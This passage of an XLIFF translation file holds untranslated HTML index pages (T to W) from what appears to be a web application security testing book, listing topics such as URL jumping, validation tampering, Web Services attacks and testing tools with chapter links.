TextPad&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec5.html#iddle1611"&gt; Wget&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec2.html#iddle1612"&gt; Wikto&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec3.html#iddle1613"&gt; mining for files&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1614"&gt; TRACE (HTTP)&lt;/a&gt;&lt;a class="v2" href="ch08lev1sec2.html#iddle1615"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec6.html#iddle1616"&gt; transactions between Web users and Web servers&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1617"&gt; Transmission Control Protocol (TCP)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1618"&gt; Transport Layer Security (TLS)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1619"&gt; Trojan programs&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=S.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=U.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=T.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html" style="font-weight:bold;"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch10lev1sec3.html#iddle1620"&gt; UDDI (Universal Description, Discovery, and Integration)&lt;/a&gt;&lt;a class="v2" href="ch10lev1sec3.html#iddle1621"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1622"&gt; UDP (User Datagram Protocol)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1623"&gt; UNIX&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1624"&gt; UNIX networks&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1625"&gt; URL (universal resource locator)&lt;/a&gt;&lt;a class="v2" href="ch03lev1sec2.html#iddle1626"&gt; 2nd&lt;/a&gt;&lt;a class="v2" href="ch08lev1sec2.html#iddle1627"&gt; 3rd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1628"&gt; question mark (?)&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch04lev1sec2.html#iddle1629"&gt; URL jumping&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1630"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1631"&gt; performing this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1632"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1633"&gt; usability&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec2.html#iddle1634"&gt; user agent strings&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1635"&gt; User Datagram Protocol (UDP)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1636"&gt; user interface controls&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1637"&gt; user interfaces&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1638"&gt; user preference parameters&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=T.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=V.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=U.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html" style="font-weight:bold;"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>validation&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;bypass client-side validation attacks
 [See  &lt;a class="docLink" href="index&amp;amp;view=B.html#iddle1087"&gt;bypass client-side validation attacks&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1640"&gt; ColdFusion&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1641"&gt; e-mail addresses&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1642"&gt; input&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch01lev1sec6.html#iddle1643"&gt; network traffic, Web clients&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1644"&gt; XML&lt;/a&gt;&lt;br /&gt;validation tampering&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1645"&gt; selectarrangements.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1646"&gt; selectflowers.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1647"&gt; verbose messages, saving&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1648"&gt; vulnerabilities, searching for&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app03lev1sec9.html#iddle1649"&gt; VulnXML&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=U.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=W.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=V.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html" style="font-weight:bold;"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch01lev1sec2.html#iddle1650"&gt; WANs (wide-area networks)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec6.html#iddle1651"&gt; &lt;span class="docEmphasis"&gt;Warriors of the Net&lt;/span&gt;&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1652"&gt; watchdog sites&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch01lev1sec2.html#iddle1653"&gt; Web&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch01lev1sec5.html#iddle1654"&gt; versus client-server networks&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1655"&gt; Web applications, mapping out architecture&lt;/a&gt;&lt;a class="v2" href="ch02lev1sec2.html#iddle1656"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec3.html#iddle1657"&gt; Web browsers&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec9.html#iddle1658"&gt; ActiveX controls&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec9.html#iddle1659"&gt; BHOs (browser helper objects)&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec8.html#iddle1660"&gt; caching pages&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec4.html#iddle1661"&gt; cookies&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec3.html#iddle1662"&gt; referrer tags&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec2.html#iddle1663"&gt; user agent strings&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec5.html#iddle1664"&gt; Web bugs&lt;/a&gt;&lt;br /&gt;Web clients&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch01lev1sec6.html#iddle1665"&gt; testing&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch01lev1sec6.html#iddle1666"&gt; validating traffic&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1667"&gt; Web development, failure of&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec3.html#iddle1668"&gt; Web interactivity&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1669"&gt; Web proxy programs&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1670"&gt; Web proxy tool&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec6.html#iddle1671"&gt; Web servers, testing&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch10lev1sec1.html#iddle1672"&gt; Web Services&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec3.html#iddle1673"&gt; SOAP&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec3.html#iddle1674"&gt; threat profile&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1675"&gt; buffer overflow attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1676"&gt; external entity attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1677"&gt; parameter tampering&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1678"&gt; recursive payload attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec3.html#iddle1679"&gt; WSDL scanning attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1680"&gt; XPATHinjection attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec3.html#iddle1681"&gt; UDDI&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec3.html#iddle1682"&gt; WSDL&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec3.html#iddle1683"&gt; XML&lt;/a&gt;&lt;br /&gt;Web Services Description Language
 [See  &lt;a class="docLink" href="index&amp;amp;view=W.html#iddle1697"&gt;WSDL (Web Services Description Language)&lt;/a&gt;.]&lt;br /&gt; &lt;a class="v2" href="app03lev1sec5.html#iddle1685"&gt; Wget&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1686"&gt; white-lists&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1687"&gt; WhiteHat Security&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1688"&gt; wide-area networks (WANs)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app03lev1sec2.html#iddle1689"&gt; Wikto&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app03lev1sec3.html#iddle1690"&gt; mining for files&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1691"&gt; Windows networks&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1692"&gt; WordPad, cookies&lt;/a&gt;&lt;br /&gt;World Wide Web
 [See  &lt;a class="docLink" href="index&amp;amp;view=W.html#iddle1653"&gt;Web&lt;/a&gt;.]&lt;br /&gt;worms&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1694"&gt; buffer overflows&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1695"&gt; CodeRed worm&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1696"&gt; Santy worm&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch10lev1sec3.html#iddle1697"&gt; WSDL (Web Services Description Language)&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec3.html#iddle1698"&gt; scanning attacks&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
